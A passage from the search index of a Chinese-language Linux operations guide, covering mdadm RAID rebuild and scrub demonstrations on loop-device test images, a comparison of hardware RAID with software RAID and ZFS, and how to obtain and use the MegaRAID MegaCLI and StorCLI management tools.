\u200b\u63d0\u4f9b\u200b\u7684\u200b\u76f8\u5173\u200b\u4fe1\u606f\u200b\u3002</p>"},{"location":"ops/storage/raid/#mdadm-rebuild","title":"\u91cd\u5efa\u200b\u64cd\u4f5c","text":"<p>\u200b\u4e0e\u200b LVM \u200b\u4e00\u7ae0\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u5c55\u793a\u200b\u5728\u200b\u4e00\u5757\u200b\u76d8\u200b\u4e22\u5931\u200b\uff08\u200b\u635f\u574f\u200b\uff09\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u7684\u200b\u64cd\u4f5c\u200b\uff1a</p> <pre><code>$ sudo mdadm --stop /dev/md0\nmdadm: stopped /dev/md0\n$ sudo losetup -D\n$ sudo losetup -f --show md0.img\n/dev/loop0\n$ sudo losetup -f --show md1.img\n/dev/loop1\n$ # \u200b\u6b64\u65f6\u200b /dev/md0 \u200b\u5df2\u7ecf\u200b\u81ea\u52a8\u200b\u6784\u5efa\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5904\u4e8e\u200b\u4e22\u5931\u200b\u4e00\u5757\u200b\u76d8\u200b\u7684\u200b\u72b6\u6001\u200b\n$ sudo mdadm --detail /dev/md0\n/dev/md0:\n           Version : 1.2\n     Creation Time : Thu Feb 22 13:05:14 2024\n        Raid Level : raid5\n        Array Size : 2093056 (2044.00 MiB 2143.29 MB)\n     Used Dev Size : 1046528 (1022.00 MiB 1071.64 MB)\n      Raid Devices : 3\n     Total Devices : 2\n       Persistence : Superblock is persistent\n\n       Update Time : Thu Feb 22 13:05:19 2024\n             State : clean, degraded \n    Active Devices : 2\n   Working Devices : 2\n    Failed Devices : 0\n     Spare Devices : 0\n\n            Layout : left-symmetric\n        Chunk Size : 512K\n\nConsistency Policy : resync\n\n              Name : hostname:0  (local to host hostname)\n              UUID : 3e4455f5:65e4251c:b21c1c81:13b44a8b\n            Events : 18\n\n    Number   Major   Minor   RaidDevice State\n       0       7        0        0      active sync   /dev/loop0\n       1       7        1        1      active sync   /dev/loop1\n       -       0        0        2      removed\n$ # \u200b\u6dfb\u52a0\u200b\u65b0\u200b\u7684\u200b\u76d8\u200b\n$ truncate -s 1G md3.img\n$ sudo losetup /dev/loop3 md3.img\n$ sudo mdadm --add /dev/md0 /dev/loop3\n$ sudo mdadm --detail /dev/md0\n/dev/md0:\n           Version : 1.2\n     Creation Time : Thu Feb 22 13:05:14 2024\n        Raid Level : raid5\n        Array Size : 2093056 (2044.00 MiB 2143.29 MB)\n     Used Dev Size : 1046528 (1022.00 MiB 1071.64 MB)\n      Raid Devices : 3\n     Total Devices : 3\n       Persistence : Superblock is persistent\n\n       Update Time : Thu Feb 22 13:52:32 2024\n             State : clean, degraded, recovering \n    Active Devices : 2\n   Working Devices : 3\n    Failed Devices : 0\n     Spare Devices : 1\n\n            Layout : left-symmetric\n        Chunk Size : 512K\n\nConsistency Policy : resync\n\n    Rebuild Status : 35% complete\n\n              Name : hostname:0  (local to host hostname)\n              UUID : 3e4455f5:65e4251c:b21c1c81:13b44a8b\n            Events : 26\n\n    Number   Major   Minor   RaidDevice State\n       0       7        0        0      active sync   /dev/loop0\n       1       7        1        1      active sync   /dev/loop1\n       3       7        3        2      spare rebuilding   /dev/loop3\n</code></pre> <p>\u200b\u6dfb\u52a0\u200b\u65b0\u76d8\u200b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u91cd\u5efa\u200b\u64cd\u4f5c\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u5f00\u59cb\u200b\u3002</p>"},{"location":"ops/storage/raid/#mdadm-scrub","title":"\u5b8c\u6574\u6027\u68c0\u67e5","text":"<p>\u200b\u8fd9\u91cc\u200b\u5c55\u793a\u200b\u4e09\u76d8\u200b RAID 1 \u200b\u4e0b\u200b\u8fdb\u884c\u200b\u68c0\u67e5\u200b\u4e0e\u200b\u4fee\u590d\u200b\u7684\u200b\u573a\u666f\u200b\uff1a</p> <pre><code>$ sudo mdadm --stop /dev/md0\nmdadm: stopped /dev/md0\n$ sudo mdadm --misc --zero-superblock /dev/loop0 /dev/loop1 /dev/loop3\n$ sudo mdadm --create /dev/md0 --level=1 --raid-devices=3 /dev/loop0 /dev/loop1 /dev/loop3\nmdadm: Note: this array has metadata at the start and\n    may not be suitable as a boot device.  If you plan to\n    store '/boot' on this device please ensure that\n    your boot-loader understands md/v1.x metadata, or use\n    --metadata=0.90\nContinue creating array? y\nmdadm: Defaulting to version 1.2 metadata\nmdadm: array /dev/md0 started.\n$ # \u200b\u5411\u200b\u5176\u4e2d\u200b\u4e00\u5757\u200b\u76d8\u200b\u5199\u5165\u200b\u5783\u573e\u200b\u6570\u636e\u200b\n$ sudo dd if=/dev/urandom of=/dev/loop0 bs=1M count=1 oseek=100\n1+0 records in\n1+0 records out\n1048576 bytes (1.0 MB, 1.0 MiB) copied, 0.00406889 s, 258 MB/s\n$ sudo bash -c 'echo check &gt; /sys/block/md0/md/sync_action'\n$ # \u200b\u5728\u200b /proc/mdstat \u200b\u4e2d\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u68c0\u67e5\u200b\u7684\u200b\u8fdb\u5ea6\u200b\n$ cat /proc/mdstat\nPersonalities : [raid6] [raid5] [raid4] [raid1] [raid0] \nmd0 : active raid1 loop3[2] loop1[1] loop0[0]\n      1046528 blocks super 1.2 [3/3] [UUU]\n      [===================&gt;.]  check = 95.3% (998016/1046528) finish=0.0min speed=249504K/sec\n\nunused devices: &lt;none&gt;\n$ # \u200b\u7531\u4e8e\u200b\u6211\u4eec\u200b\u8fd9\u91cc\u200b\u76d8\u200b\u5f88\u5c0f\u200b\uff0c\u200b\u6240\u4ee5\u200b\u68c0\u67e5\u200b\u5f88\u5feb\u200b\u5c31\u200b\u7ed3\u675f\u200b\u4e86\u200b\n$ cat /sys/block/md0/md/mismatch_cnt  # \u200b\u83b7\u53d6\u200b\u4e0d\u200b\u4e00\u81f4\u200b\u7684\u200b\u5757\u200b\u6570\u200b\n4096\n$ # \u200b\u7531\u4e8e\u200b\u6211\u4eec\u200b\u6709\u200b\u8db3\u591f\u200b\u591a\u200b\u7684\u200b\u526f\u672c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c1d\u8bd5\u200b\u4fee\u590d\u200b\n$ sudo bash -c 'echo repair &gt; /sys/block/md0/md/sync_action'\n$ # \u200b\u5728\u200b /proc/mdstat \u200b\u4e2d\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u4fee\u590d\u200b\u7684\u200b\u8fdb\u5ea6\u200b\n$ cat /proc/mdstat\nPersonalities : [raid6] [raid5] [raid4] [raid1] [raid0] \nmd0 : active raid1 loop3[2] loop1[1] loop0[0]\n      1046528 blocks super 1.2 [3/3] [UUU]\n      [===========&gt;.........]  resync = 57.4% (601984/1046528) finish=0.0min speed=300992K/sec\n\nunused devices: &lt;none&gt;\n$ # \u200b\u4fee\u590d\u200b\u5b8c\u6210\u200b\u540e\u200b\uff0cmismatch_cnt \u200b\u4e2d\u200b\u4ecd\u7136\u200b\u8bb0\u5f55\u200b\u7684\u200b\u662f\u200b\u4e0d\u200b\u4e00\u81f4\u200b\u7684\u200b\u6570\u91cf\u200b\n$ # \u200b\u518d\u200b\u6267\u884c\u200b\u4e00\u6b21\u200b check \u200b\u540e\u200b mismatch_cnt \u200b\u503c\u4f1a\u200b\u53d8\u4e3a\u200b 0\n</code></pre>"},{"location":"ops/storage/raid/#hardware-raid","title":"\u786c\u4ef6\u200b RAID \u200b\u65b9\u6848","text":"<p>\u200b\u4e0d\u540c\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u53ef\u80fd\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e0d\u540c\u200b\u7684\u200b\u786c\u4ef6\u200b RAID \u200b\u65b9\u6848\u200b\uff0c\u200b\u76ee\u524d\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b\u662f\u200b MegaRAID \u200b\u65b9\u6848\u200b\u3002 \u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u542f\u52a8\u200b\u65f6\u200b\uff0c\u200b\u6309\u4e0b\u200b\u6307\u5b9a\u200b\u7684\u200b\u6309\u952e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8fdb\u5165\u200b RAID \u200b\u5361\u200b\u7684\u200b\u8bbe\u7f6e\u200b\u754c\u9762\u200b\u8fdb\u884c\u200b\u64cd\u4f5c\u200b\u3002</p> \u200b\u56fe\u7247\u200b\uff1a\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u770b\u5230\u200b\u7684\u200b\u754c\u9762\u200b <p> MegaRAID \u200b\u5728\u200b\u5f00\u673a\u200b\u65f6\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u8fdb\u5165\u200b\u7684\u200b\u8bbe\u7f6e\u200b\u9875\u9762\u200b </p> <p>\u200b\u540c\u65f6\u200b\uff0c\u200b\u786c\u4ef6\u200b RAID \u200b\u5382\u5546\u200b\u4e00\u822c\u200b\u4f1a\u200b\u63d0\u4f9b\u200b\u79c1\u6709\u200b\u7684\u200b\u5de5\u5177\u200b\u8fdb\u884c\u200b\u7ba1\u7406\u200b\uff0c\u200b\u4f8b\u5982\u200b MegaRAID \u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>megacli</code> \u200b\u6216\u200b <code>storcli</code>\uff0c HPE \u200b\u7684\u200b Smart Array \u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>ssacli</code> \u200b\u7b49\u200b\u3002 \u200b\u8fd9\u4e9b\u200b\u8f6f\u4ef6\u200b Linux \u200b\u53d1\u884c\u7248\u200b\u4e0d\u200b\u81ea\u5e26\u200b\uff0c\u200b\u9700\u8981\u200b\u81ea\u884c\u200b\u4e0b\u8f7d\u5b89\u88c5\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u4ecb\u7ecd\u200b MegaRAID \u200b\u76f8\u5173\u200b\u7684\u200b\u4e00\u4e9b\u200b\u64cd\u4f5c\u200b\u3002</p> <p>@taoky: \u200b\u786c\u4ef6\u200b RAID\uff0cmd/LVM\uff0c\u200b\u8fd8\u662f\u200b ZFS\uff1f</p> <p>\u200b\u9009\u62e9\u200b\u4f55\u79cd\u200b\u65b9\u6848\u200b\uff0c\u200b\u9700\u8981\u200b\u5728\u200b\u7cfb\u7edf\u200b\u90e8\u7f72\u200b\u524d\u200b\u786e\u5b9a\u200b\u597d\u200b\uff0c\u200b\u5426\u5219\u200b\u540e\u7eed\u200b\u5207\u6362\u200b\u7684\u200b\u4ee3\u4ef7\u200b\u6781\u9ad8\u200b\u3002 \u200b\u5728\u200b\u7ea6\u200b\u5341\u5e74\u200b\u524d\u200b\uff0c\u200b\u786c\u4ef6\u200b RAID \u200b\u662f\u200b\u5f88\u200b\u5408\u7406\u200b\u7684\u200b\u65b9\u6848\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u80fd\u591f\u200b\u8282\u7701\u200b CPU \u200b\u8ba1\u7b97\u8d44\u6e90\u200b\uff0c\u200b\u6027\u80fd\u200b\u8db3\u591f\u200b\u597d\u200b\uff0c\u200b\u914d\u7f6e\u200b\u7b80\u5355\u200b\uff0c\u200b\u800c\u4e14\u200b\u670d\u52a1\u5668\u200b\u4e00\u822c\u200b\u90fd\u200b\u4f1a\u200b\u5e26\u4e2a\u200b\u5361\u200b\u3002 \u200b\u4f46\u200b\u5728\u200b\u4eca\u5929\u200b\uff0c\u200b\u786c\u4ef6\u200b RAID \u200b\u65b9\u6848\u200b\uff08\u200b\u4ee5\u53ca\u200b\u5757\u200b\u8bbe\u5907\u200b\u7ea7\u522b\u200b\u7684\u200b\u8f6f\u4ef6\u200b RAID \u200b\u65b9\u6848\u200b\uff09\u200b\u53ef\u80fd\u200b\u4e0d\u200b\u603b\u662f\u200b\u6700\u4f73\u200b\u9009\u62e9\u200b\u4e86\u200b\uff1a</p> <ul> <li>CPU \u200b\u6027\u80fd\u200b\u63d0\u5347\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u8f6f\u4ef6\u200b RAID \u200b\u7684\u200b\u8ba1\u7b97\u200b\u5f00\u9500\u200b\u4e0d\u518d\u200b\u662f\u200b\u74f6\u9888\u200b</li> <li>\u200b\u8f6f\u4ef6\u200b RAID \u200b\u65b9\u6848\u200b\u7684\u200b\u76d1\u63a7\u200b\u4e0e\u200b\u8fd0\u7ef4\u200b\u64cd\u4f5c\u200b\u66f4\u200b\u65b9\u4fbf\u200b<ul> <li>\u200b\u8003\u8651\u200b\u5230\u200b\u5382\u5546\u200b\u6df7\u4e71\u200b\u7684\u200b\u6587\u6863\u200b\u7ba1\u7406\u200b\uff0c\u200b\u6211\u200b\u6562\u80af\u5b9a\u200b\u5927\u591a\u6570\u200b\u914d\u7f6e\u200b\u786c\u4ef6\u200b RAID \u200b\u7684\u200b\u8fd0\u7ef4\u200b\u90fd\u200b\u4e0d\u200b\u592a\u200b\u6e05\u695a\u200b\u5982\u4f55\u200b\u4f7f\u7528\u200b MegaCLI/StorCLI \u200b\u6765\u200b\u76d1\u63a7\u200b\u786c\u76d8\u200b\u7684\u200b\u72b6\u6001\u200b</li> <li>\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u4eba\u53bb\u200b\u673a\u623f\u200b\uff08\u200b\u6216\u8005\u200b\u53bb\u200b\u673a\u623f\u200b\u7684\u200b\u4eba\u200b don't care\uff09\uff0c\u200b\u90a3\u4e48\u200b\u7ed3\u679c\u200b\u5c31\u662f\u200b\uff1aRAID 6\uff08\u200b\u6216\u8005\u200b RAID 10\uff09\u200b\u574f\u200b\u4e86\u200b\u4e00\u5757\u200b\u76d8\u200b =&gt; \u200b\u6ca1\u200b\u4eba\u200b\u77e5\u9053\u200b =&gt; \u200b\u53c8\u574f\u4e86\u200b\u4e00\u76d8\u200b =&gt; \u200b\u8fd8\u662f\u200b\u6ca1\u200b\u4eba\u200b\u77e5\u9053\u200b\uff08\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u670d\u52a1\u5668\u200b\u53d8\u6162\u200b\u4e86\u200b\uff09 =&gt; \u200b\u53c8\u200b\u574f\u200b\u76d8\u200b\u4e86\u200b =&gt; \u200b\u670d\u52a1\u200b\u6302\u200b\u4e86\u200b\uff0cBoom\uff0c\u200b\u53ea\u80fd\u200b\u6c2a\u200b\u91d1\u200b\uff08\u200b\u53bb\u200b\u6570\u636e\u6062\u590d\u200b\uff09\u200b\u4e86\u200b\uff01</li> <li>\u200b\u800c\u200b\u67e5\u770b\u200b\u8f6f\u4ef6\u200b RAID \u200b\u7684\u200b\u72b6\u6001\u200b\u5c31\u200b\u65b9\u4fbf\u200b\u5f97\u200b\u591a\u200b</li> </ul> </li> <li>\u200b\u4e0d\u200b\u53d7\u5236\u4e8e\u200b\u95ed\u6e90\u200b\u3001\u200b\u65e0\u6cd5\u200b\u8c03\u8bd5\u200b\u7684\u200b\u56fa\u4ef6\u200b<ul> <li>\u200b\u6211\u4eec\u200b\u66fe\u7ecf\u200b\u9047\u5230\u200b\u8fc7\u200b\u5728\u200b\u67d0\u53f0\u200b\u65e7\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\uff0c\u200b\u786c\u4ef6\u200b RAID \u200b\u5361\u200b\u56fa\u4ef6\u200b\u591a\u6b21\u200b\u5d29\u6e83\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6574\u4e2a\u200b\u9635\u5217\u200b\uff08\u200b\u5305\u62ec\u200b\u7cfb\u7edf\u76d8\u200b\uff09\u200b\u90fd\u200b\u4f1a\u200b\u6389\u7ebf\u200b</li> <li>\u200b\u5e76\u4e14\u200b\u6ca1\u6709\u200b\u4eba\u200b\u77e5\u9053\u200b\u4e3a\u4ec0\u4e48\u200b\u2014\u2014\u200b\u5f00\u653e\u200b\u7684\u200b\u8f6f\u4ef6\u200b RAID \u200b\u65b9\u6848\u200b\u81f3\u5c11\u200b\u8fd8\u6709\u200b\u8c03\u8bd5\u200b\u7684\u200b\u673a\u4f1a\u200b</li> <li>\u200b\u5546\u4e1a\u200b SAN \u200b\u65b9\u6848\u200b\u4e5f\u200b\u6709\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u95ee\u9898\u200b\u2014\u2014\u200b\u6211\u4eec\u200b\u4e5f\u200b\u9047\u5230\u200b\u8fc7\u200b SAN \u200b\u7684\u200b\u7ba1\u7406\u200b\u53e3\u200b\u542f\u52a8\u200b\u4e00\u4f1a\u200b\u4e4b\u540e\u200b\u5c31\u200b\u76f4\u63a5\u200b\u574f\u6389\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u800c\u4e14\u200b\u65e0\u6cd5\u200b\u5904\u7406\u200b\uff08\u200b\u540c\u6837\u200b\uff0c\u200b\u6ca1\u6709\u200b\u4eba\u200b\u77e5\u9053\u200b\u4e3a\u4ec0\u4e48\u200b\uff09</li> </ul> </li> <li>\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u6bd4\u5757\u200b\u8bbe\u5907\u200b\uff08\u200b\u548c\u200b\u9635\u5217\u5361\u200b\uff09\u200b\u66f4\u200b\u61c2\u200b\u6570\u636e\u200b<ul> <li>ZFS/Btrfs \u200b\u7684\u200b\u91cd\u5efa\u200b\u64cd\u4f5c\u200b\u53ea\u4f1a\u200b\u6d89\u53ca\u200b\u5230\u200b\u5b9e\u9645\u200b\u7684\u200b\u6570\u636e\u200b\u5757\u200b\uff0c\u200b\u800c\u200b\u4e0d\u4f1a\u200b\u6d89\u53ca\u200b\u5230\u200b\u6574\u4e2a\u200b\u8bbe\u5907\u200b\uff0c\u200b\u51cf\u5c11\u200b\u91cd\u5efa\u200b\u65f6\u95f4\u200b\u4e0e\u200b\u98ce\u9669\u200b</li> <li>ZFS/Btrfs \u200b\u7684\u200b checksum \u200b\u4f1a\u200b\u5728\u200b\u8bfb\u53d6\u200b\u65f6\u200b\u68c0\u67e5\u6570\u636e\u200b\u7684\u200b\u5b8c\u6574\u6027\u200b\uff0c\u200b\u5e2e\u52a9\u200b\u5904\u7406\u200b bit rot \u200b\u95ee\u9898\u200b\uff08LVM \u200b\u7684\u200b dm-integrity \u200b\u4e5f\u200b\u6709\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u529f\u80fd\u200b\uff09</li> </ul> </li> </ul> <p>\u200b\u6240\u4ee5\u200b\u76ee\u524d\u200b\u7684\u200b\u7ed3\u8bba\u200b\u662f\u200b\uff1a\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5b58\u50a8\u200b\u5927\u91cf\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u90a3\u4e48\u200b ZFS \u200b\u7edd\u5bf9\u200b\u503c\u5f97\u200b\u4e00\u8bd5\u200b\uff08\u200b\u81f3\u4e8e\u200b Btrfs\uff0c\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u81f3\u5c11\u200b\u7b49\u200b\u5b83\u200b\u7684\u200b RAID 5/6 \u200b\u5b9e\u73b0\u200b\u7a33\u5b9a\u4e0b\u6765\u200b\u518d\u8bf4\u200b\u4e86\u200b\uff09\u3002</p> <p>\u200b\u5f53\u7136\u200b\u4e86\u200b\uff0c\u200b\u5982\u679c\u200b\u4f60\u200b\u5728\u200b\u4f7f\u7528\u200b Windows Server\uff0c\u200b\u90a3\u4e48\u200b\u786c\u4ef6\u200b RAID\u2026\u2026\u200b\u5927\u6982\u200b\u4ecd\u7136\u200b\u8fd8\u662f\u200b\u4e00\u4e2a\u200b\u633a\u4e0d\u9519\u200b\u7684\u200b\u9009\u62e9\u200b\uff1f \u200b\u5982\u679c\u200b\u613f\u610f\u200b\u5403\u8783\u87f9\u200b\u7684\u8bdd\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u8bd5\u8bd5\u200b ReFS\u2026\u2026</p>"},{"location":"ops/storage/raid/#get-megaraid-tools","title":"\u83b7\u53d6\u200b\u7ba1\u7406\u8f6f\u4ef6","text":"<p>MegaCLI \u200b\u662f\u200b\u65e9\u671f\u200b\u7684\u200b MegaRAID \u200b\u7ba1\u7406\u5de5\u5177\u200b\uff0c\u200b\u4e4b\u540e\u200b\u88ab\u200b StorCLI \u200b\u53d6\u4ee3\u200b\uff0c\u200b\u4f46\u662f\u200b\u67d0\u4e9b\u200b\u578b\u53f7\u200b\u7684\u200b\u65e7\u200b\u9635\u5217\u200b\u4ec5\u200b\u652f\u6301\u200b MegaCLI\u3002 \u200b\u7531\u4e8e\u200b\u535a\u901a\u200b\u7684\u200b\u6587\u6863\u200b\u7ba1\u7406\u6df7\u4e71\u200b\uff0c\u200b\u627e\u5230\u200b\u9700\u8981\u200b\u7684\u200b\u7ba1\u7406\u8f6f\u4ef6\u200b\u5e76\u200b\u4e0d\u662f\u200b\u4e00\u4ef6\u200b\u5bb9\u6613\u200b\u7684\u200b\u4e8b\u60c5\u200b\u3002 \u200b\u8fd9\u91cc\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u94fe\u63a5\u200b\uff1a</p> <p>\u200b\u5c3d\u53ef\u80fd\u200b\u4ece\u200b\u5b98\u65b9\u200b\u6765\u6e90\u200b\u83b7\u53d6\u200b\u8fd9\u4e9b\u200b\u5de5\u5177\u200b</p> <p>\u200b\u5373\u4f7f\u200b\u4f1a\u200b\u9ebb\u70e6\u200b\u4e00\u4e9b\u200b\uff0c\u200b\u5728\u200b\u4e0b\u8f7d\u200b\u524d\u200b\u786e\u8ba4\u200b\u6765\u6e90\u200b\u7ad9\u70b9\u200b\uff08\u200b\u5728\u200b\u8fd9\u91cc\u200b\u662f\u200b\u535a\u901a\u200b\uff09\u200b\u662f\u200b\u975e\u5e38\u200b\u91cd\u8981\u200b\u7684\u200b\u3002 \u200b\u4ece\u200b\u4e0d\u660e\u200b\u7f51\u7ad9\u200b\u4e0b\u8f7d\u5de5\u5177\u200b\u5b58\u5728\u200b\u5f88\u5927\u200b\u7684\u200b\u4f9b\u5e94\u94fe\u200b\u653b\u51fb\u200b\u7684\u200b\u98ce\u9669\u200b\u3002</p> <ul> <li>\u200b\u7528\u6237\u624b\u518c\u200b\uff1ahttps://docs.broadcom.com/docs/12353236</li> <li>MegaCLI \u200b\u4e0b\u8f7d\u200b\uff1ahttps://docs.broadcom.com/docs-and-downloads/raid-controllers/raid-controllers-common-files/8-07-14_MegaCLI.zip\uff08SHA256 <code>d9b152ae3dab76a334b9251702dba3311ceed91b58aaf52d916eb4ba1c2ab6e9</code>\uff09</li> <li>StorCLI \u200b\u4e0b\u8f7d\u200b\uff1ahttps://docs.broadcom.com/docs/1232743397</li> </ul> <p>\u200b\u538b\u7f29\u5305\u200b\u4e2d\u200b\u5305\u542b\u200b\u7684\u200b\u662f\u200b rpm \u200b\u5305\u200b\uff0c\u200b\u5728\u200b\u975e\u200b rpm \u200b\u7cfb\u200b\u7684\u200b\u53d1\u884c\u7248\u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>rpm2cpio</code> \u200b\u89e3\u538b\u200b\u540e\u200b\u624b\u52a8\u200b\u300c\u200b\u5b89\u88c5\u200b\u300d\uff1a</p> <pre><code>$ rpm2cpio MegaCli-8.07.14-1.noarch.rpm | cpio -div\n./opt/MegaRAID/MegaCli/MegaCli\n./opt/MegaRAID/MegaCli/MegaCli64\n./opt/MegaRAID/MegaCli/libstorelibir-2.so.14.07-0\n11194 blocks\n</code></pre> <p>\u200b\u5c06\u200b\u89e3\u538b\u200b\u51fa\u200b\u7684\u200b\u6587\u4ef6\u200b\uff08\u200b\u4e00\u822c\u200b\u90fd\u200b\u5728\u200b <code>opt</code> \u200b\u91cc\u9762\u200b\uff09\u200b\u653e\u5230\u200b\u5408\u9002\u200b\u7684\u200b\u4f4d\u7f6e\u200b\u3002 \u200b\u5982\u679c\u200b\u5728\u200b\u8fd0\u884c\u200b\u65f6\u200b\u7f3a\u5c11\u200b\u5e93\u200b\uff08\u200b\u4f8b\u5982\u200b <code>libncurses.so.5</code>\uff09\uff0c\u200b\u5b89\u88c5\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5305\u200b\u5373\u53ef\u200b\u3002</p> <p>MegaCLI \u200b\u4e0e\u200b StorCLI \u200b\u7684\u200b\u64cd\u4f5c\u200b\u6709\u200b\u8bb8\u591a\u200b\u4e0d\u540c\u200b\uff0c\u200b\u4e0b\u9762\u200b\u4e3b\u8981\u200b\u5c55\u793a\u200b StorCLI \u200b\u7684\u200b\u64cd\u4f5c\u200b\u3002 MegaCLI \u200b\u7684\u200b\u76f8\u4f3c\u200b\u547d\u4ee4\u200b\u4f1a\u200b\u6298\u53e0\u200b\u7ed9\u51fa\u200b\uff08\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e2d\u200b\uff0c\u200b\u4e24\u8005\u200b\u5c55\u793a\u200b\u7684\u200b\u662f\u200b\u4e0d\u540c\u200b\u7684\u200b\u9635\u5217\u200b\uff09\u3002</p> <p>\u200b\u4f7f\u7528\u200b\u65f6\u200b\u52a0\u4e0a\u200b <code>-NoLog</code> (MegaCLI) / <code>nolog</code> (StorCLI) \u200b\u53c2\u6570\u200b</p> <p>MegaRAID \u200b\u7684\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u5de5\u5177\u200b\u9ed8\u8ba4\u200b\u6bcf\u6b21\u200b\u6267\u884c\u200b\u90fd\u200b\u4f1a\u200b\u5728\u200b\u5f53\u524d\u5de5\u4f5c\u200b\u76ee\u5f55\u200b\u521b\u5efa\u200b\u65e5\u5fd7\u200b\u6587\u4ef6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-NoLog</code> \u200b\u6216\u200b <code>nolog</code> \u200b\u53c2\u6570\u200b\u7981\u7528\u200b\u3002</p> <p>StorCLI \u200b\u7684\u200b JSON \u200b\u652f\u6301\u200b</p> <p>StorCLI \u200b\u652f\u6301\u200b\u8f93\u51fa\u200b JSON \u200b\u683c\u5f0f\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u8fd9\u200b\u5bf9\u200b\u7a0b\u5e8f\u5316\u200b\u89e3\u6790\u200b RAID \u200b\u9635\u5217\u200b\u72b6\u6001\u200b\u5f88\u200b\u6709\u200b\u5e2e\u52a9\u200b\u3002 \u200b\u5728\u200b\u547d\u4ee4\u200b\u7684\u200b\u6700\u540e\u200b\u6dfb\u52a0\u200b <code>J</code> \u200b\u5373\u53ef\u200b\uff0c\u200b\u5982\u200b\uff1a</p> <pre><code>$ sudo ./storcli64 /c0 show all nolog J\n{\n\"Controllers\":[\n{\n  \"Command Status\" : {\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff09\n</code></pre>"},{"location":"ops/storage/raid/#megaraid-basics","title":"\u57fa\u7840\u200b\u6982\u5ff5","text":"<p>MegaRAID \u200b\u652f\u6301\u200b\u7ba1\u7406\u200b\u591a\u4e2a\u200b RAID \u200b\u63a7\u5236\u5668\u200b\uff08Adapter/Controller\uff09\uff0c\u200b\u6bcf\u4e2a\u200b\u63a7\u5236\u5668\u200b\u53ef\u4ee5\u200b\u8fde\u63a5\u200b\u4e00\u4e2a\u200b\u6216\u200b\u591a\u4e2a\u200b\u673a\u67dc\u200b\uff08Enclosure\uff09\uff0c \u200b\u673a\u67dc\u200b\u4e2d\u6709\u200b\u7269\u7406\u200b\u78c1\u76d8\u200b\uff08Physical Drive, PD\uff09\uff0c\u200b\u8fd9\u4e9b\u200b\u78c1\u76d8\u200b\u53ef\u4ee5\u200b\u7ec4\u6210\u200b\u865a\u62df\u200b\u78c1\u76d8\u200b\uff08Virtual Drive, VD \u200b\u6216\u200b Logical Drive, LD\uff09\u3002</p> <p>\u200b\u56e0\u6b64\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u67e5\u770b\u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5176\u200b\u63a7\u5236\u200b\u7684\u200b\u673a\u67dc\u200b\u3001\u200b\u7269\u7406\u200b/\u200b\u865a\u62df\u200b\u78c1\u76d8\u200b\u7684\u200b\u76f8\u5173\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>$ sudo ./storcli64 /c0 show all nolog  # /c0 \u200b\u8868\u793a\u200b\u63a7\u5236\u5668\u200b 0\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b /call \u200b\u8868\u793a\u200b\u6240\u6709\u200b\u63a7\u5236\u5668\u200b\nGenerating detailed summary of the adapter, it may take a while to complete.\n\nCLI Version = 007.1513.0000.0000 Apr 01, 2021\nOperating system = Linux 5.10.0-21-amd64\nController = 0\nStatus = Success\nDescription = None\n\uff08\u200b\u4ee5\u4e0b\u200b\u7701\u7565\u200b\uff1b\u200b\u4e0a\u9762\u200b\u7684\u200b\u90e8\u5206\u200b\u6bcf\u6b21\u200b storcli \u200b\u6b63\u786e\u200b\u6267\u884c\u200b\u65f6\u200b\u90fd\u200b\u4f1a\u200b\u8f93\u51fa\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e0b\u9762\u200b\u4e5f\u200b\u4f1a\u200b\u7701\u7565\u200b\uff09\n$ sudo ./storcli64 /c0 /eall show all nolog  # \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b /e252 \u200b\u8868\u793a\u200b\u673a\u67dc\u200b 252\n...\nEnclosure /c0/e252  